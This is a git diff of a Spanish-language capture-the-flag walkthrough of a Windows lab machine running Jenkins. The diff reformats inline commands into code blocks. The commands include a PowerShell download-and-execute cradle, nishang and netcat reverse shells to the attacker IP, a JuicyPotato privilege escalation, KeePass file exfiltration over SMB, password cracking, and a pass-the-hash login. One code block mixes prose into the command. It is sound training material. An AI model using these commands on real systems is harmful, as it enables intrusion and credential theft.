@@ -103,7 +103,11 @@ Se hace la omisión de los puertos en los cuales no se encontró información qu
 
 #### ffuf
 
-Después de casi completar el diccionario que por lo regular se usa, se identificó la ruta `askjeeves` mediante `ffuf -c -ic -u http://10.10.10.63:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.xml,.html`.
+Después de casi completar el diccionario que por lo regular se usa, se identificó la ruta `askjeeves` mediante:
+
+```bash
+ffuf -c -ic -u http://10.10.10.63:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.xml,.html
+```
 
 ![Descubrimiento de directorio](images/enum_3.png)
 
@@ -121,7 +125,11 @@ Jenkins ofrece una consola de scripts siguiendo la sintáxis de Groovy, disponib
 
 ![Consola de scripts de Jenkins](images/exploit_1.png)
 
-Al visualizar la sintáxis necesaria para ejecutar comandos de consola expuesta en la misma sección, se preparó la reverse shell de [nishang](https://github.com/samratashok/nishang) ejecutando al final del archivo la función empleada para entablar una reverse shell `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443`.
+Al visualizar la sintáxis necesaria para ejecutar comandos de consola expuesta en la misma sección, se preparó la reverse shell de [nishang](https://github.com/samratashok/nishang) ejecutando al final del archivo la función empleada para entablar una reverse shell:
+
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
+```
 
 ### Ejecución
 
@@ -139,7 +147,11 @@ Estableciendo así la reverse shell.
 
 ### Pasos previos | Preparación
 
-Igualmente se pueden ejecutar comandos directamente en la máquina mediante la creación de un nuevo item `Create New Item > Freestyle Project > Build > Execute Windows batch command`, guardando en el campo de texto el comando a ejecutar `powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')`.
+Igualmente se pueden ejecutar comandos directamente en la máquina mediante la creación de un nuevo item `Create New Item > Freestyle Project > Build > Execute Windows batch command`, guardando en el campo de texto el comando a ejecutar:
+
+```powershell
+powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')
+```
 
 ![Comando a ejecutar](images/exploit_3.png)
 
@@ -153,7 +165,13 @@ Restando sólo guardar el proceso en la plataforma y ejecutarlo (`Save > Build N
 
 ## Enumeración
 
-Al ejecutar `whoami /all` para visualizar los privilegios con los que cuenta el usuario, se visualizó disponible el `SeImpersonatePrivilege` lo que denota la ruta de escalación haciendo uso de [JuicyPotato](https://github.com/ohpe/juicy-potato).
+Al ejecutar:
+
+```
+whoami /all
+```
+
+Para observar los privilegios con los que cuenta el usuario, se visualizó disponible el privilegio `SeImpersonatePrivilege` habilitado lo que denota la ruta de escalación haciendo uso de [JuicyPotato](https://github.com/ohpe/juicy-potato).
 
 ![SeImpersonatePrivilege habilitado](images/post_1.png)
 
@@ -167,7 +185,11 @@ Además, se identificó una base de datos de KeePass `CEH.kdbx` en el directorio
 
 #### JuicyPotato
 
-Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como `nt authority\system` mediante `.\jp.exe -t * -l 1337 -p cmd.exe -a " /c C:\users\kohsuke\downloads\nc.exe -e cmd.exe 10.10.14.16 1234"`.
+Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como `nt authority\system` mediante:
+
+```powershell
+.\jp.exe -t * -l 1337 -p cmd.exe -a " /c C:\users\kohsuke\downloads\nc.exe -e cmd.exe 10.10.14.16 1234"
+```
 
 ![Obtención de reverse shell como administrator](images/post_3.png)
 
@@ -176,9 +198,19 @@ Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato 
 
 #### KeePass
 
-Se extrajo la base de datos de KeePass haciendo uso de la utilería de [impacket](https://github.com/SecureAuthCorp/impacket), mediante `impacket-smbserver smbFolder $(pwd) -smb2support` y realizando el copiado con `cp .\CEH.kdbx \\10.10.14.16\smbFolder`.
+Se extrajo la base de datos de KeePass haciendo uso de la utilería de [impacket](https://github.com/SecureAuthCorp/impacket), mediante:
 
-Posteriormente, para crackear el archivo fue necesario primero extraer el hash del mismo, usando `keepass2john CEH.kdbx > ceh.hash` para a continuación iniciar el proceso de cracking mediante `john ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt`. Obteniendo así la contraseña del archivo (`moonshine1`).
+```bash
+impacket-smbserver smbFolder $(pwd) -smb2support` y realizando el copiado con `cp .\CEH.kdbx \\10.10.14.16\smbFolder
+```
+
+Posteriormente, para crackear el archivo fue necesario primero extraer el hash del mismo, usando `keepass2john CEH.kdbx > ceh.hash` para a continuación iniciar el proceso de cracking haciendo uso de:
+
+```bash
+john ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Obteniendo así la contraseña del archivo (`moonshine1`).
 
 ![Cracking de archivo de KeePass](images/post_4.png)
 
@@ -186,7 +218,19 @@ La base de datos expone múltiples entradas con contraseñas disponibles aunque 
 
 ![Contenido de entrada sobresaliente](images/post_5.png)
 
-Por lo que hizo uso de nuevo de impacket para conectar a la máquina proveyendo el hash. Dada la estructura de lo hashes NTLM se podría usar tanto como `impacket-psexec 'administrator@10.10.10.63' -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'` como con `impacket-psexec 'administrator@10.10.10.63' -hashes ':e0fb1fb85756c24235ff238cbe81fe00'` debido a que la primera mitad corresponde al identificador de la máquina y la segunda a la "autorización" del usuario.
+Por lo que hizo uso de nuevo de impacket para conectar a la máquina proveyendo el hash. Dada la estructura de lo hashes NTLM se podría usar tanto como:
+
+```bash
+impacket-psexec 'administrator@10.10.10.63' -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
+```
+
+Como con:
+
+```bash
+impacket-psexec 'administrator@10.10.10.63' -hashes ':e0fb1fb85756c24235ff238cbe81fe00'
+```
+
+Debido a que la primera mitad corresponde al identificador de la máquina y la segunda a la "autorización" del usuario.
 
 ![Acceso mediante hash](images/post_6.png)
 
@@ -196,7 +240,17 @@ Después de buscar extraer el contenido de la bandera, se encontró el archivo `
 
 ![Mensaje de supuesta bandera](images/post_7.png)
 
-Por lo que haciendo uso de los comandos sugeridos en el artículo se pudo visualizar que el stream oculto era `root.txt` con `powershell.exe get-item -path .\hm.txt -stream *`, para posteriormente extraer su contenido mediante `powershell.exe get-content -path .\hm.txt -stream root.txt`.
+Por lo que haciendo uso de los comandos sugeridos en el artículo se pudo visualizar que el stream oculto era `root.txt` con:
+
+```powershell
+powershell.exe get-item -path .\hm.txt -stream *
+```
+
+Para posteriormente extraer su contenido mediante:
+
+```powershell
+powershell.exe get-content -path .\hm.txt -stream root.txt
+```
 
 ![Extracción de data streams](images/post_8.png)
 
